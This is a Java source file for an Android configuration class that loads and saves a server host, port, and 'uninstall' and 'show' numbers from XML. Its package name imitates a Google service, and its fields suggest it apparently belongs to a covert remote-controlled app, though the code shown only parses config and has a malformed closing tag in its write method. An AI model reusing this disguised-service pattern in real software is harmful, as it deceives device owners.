package com.tools.google.auxiliaryservices;

import android.content.Context;
import android.content.res.AssetManager;

import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserFactory;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringReader;
import java.util.regex.Pattern;

/**
 * Created by Gabriele on 07/06/16.
 */
public class ConfigurationFile
{

    //file name
    private String mFilename = "configuration.xml";
    //patten
    private static final Pattern PATTERN = Pattern.compile("^(([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\.){3}([01]?\\d\\d?|2[0-4]\\d|25[0-5])$");
    //utility
    public static boolean validateHostName(final String ip)
    {
        return PATTERN.matcher(ip).matches();
    }
    //values
    public String mHost;
    public int mPort;
    public String mUninstallNumber;
    public String mShowNumber;

    //default constructor
    public ConfigurationFile(){}

    //set filename
    public ConfigurationFile(String pathXML)
    {
        mFilename = pathXML;
    }

    //load from default file
    public ConfigurationFile(Context context)
    {
        //read
        read(context);
    }

    //set filename and load
    public ConfigurationFile(Context context, String pathXML)
    {
        //filename
        mFilename = pathXML;
        //read
        read(context);
    }

    //config
    public ConfigurationFile(String host, int port, String uninstallNumber, String showNumber)
    {
        mHost = host;
        mPort = port;
        mUninstallNumber = uninstallNumber;
        mShowNumber = showNumber;
    }

    //read file
    void read(Context context)
    {
        //get from external storage
        String xml = readXML(context, mFilename);
        //else get from assets
        if(xml==null) xml=getXML(context, mFilename);
        //parse
        if(xml!=null) parse(xml,this);

    }

    void write(Context context)
    {
        String xml =
        "<server>\n" +
                "<host>"+mHost+"</host>\n" +
                "<port>"+mPort+"</port>\n" +
                "<uninstall_number>"+mUninstallNumber+"</uninstall_number>\n" +
                "<show_number>"+mShowNumber+"</show_number>\n" +
        "<server>\n";
        writeXML(context, mFilename,xml);
    }

    static private void writeXML(Context context,String filename,String xml)
    {
        FileOutputStream outputStream;
        try
        {
            outputStream = context.openFileOutput(filename, Context.MODE_PRIVATE);
            outputStream.write(xml.getBytes());
            outputStream.close();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    static private String readXML(Context context,String filename)
    {
        String xmlString = null;
        FileInputStream inputStream;

        try
        {
            inputStream = context.openFileInput(filename);
            int length = inputStream.available();
            byte[] data = new byte[length];
            inputStream.read(data);
            xmlString = new String(data);
            inputStream.close();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        return xmlString;
    }

    static private String getXML(Context context, String filename)
    {
        String xmlString = null;
        AssetManager am = context.getAssets();
        try
        {
            InputStream is = am.open(filename);
            int length = is.available();
            byte[] data = new byte[length];
            is.read(data);
            xmlString = new String(data);
            is.close();
        }
        catch (IOException e1)
        {
            e1.printStackTrace();
        }

        return xmlString;
    }

    static private void parse(String xml,ConfigurationFile config)
    {

        try
        {
            //get objects
            XmlPullParserFactory xmlFactoryObject = XmlPullParserFactory.newInstance();
            XmlPullParser parser = xmlFactoryObject.newPullParser();
            parser.setInput(new StringReader(xml));
            //start
            int event = parser.getEventType();
            //text
            String last_text = "";
            //events
            while (event != XmlPullParser.END_DOCUMENT)
            {
                String name=parser.getName();
                switch (event)
                {
                    case XmlPullParser.START_TAG:  break;
                    case XmlPullParser.TEXT:
                        //get text
                        last_text = parser.getText();
                    break;
                    case XmlPullParser.END_TAG:
                        if(name.equals("host"))
                        {
                            config.mHost = last_text;
                        }
                        else if (name.equals("port"))
                        {
                            config.mPort = Integer.parseInt(last_text);
                        }
                        else if (name.equals("uninstall_number"))
                        {
                            config.mUninstallNumber = last_text;
                        }
                        else if (name.equals("show_number"))
                        {
                            config.mShowNumber = last_text;
                        }
                    break;
                }
                event = parser.next();
            }

        }
        catch (Exception e)
        {
            e.printStackTrace();
        }

    }


}
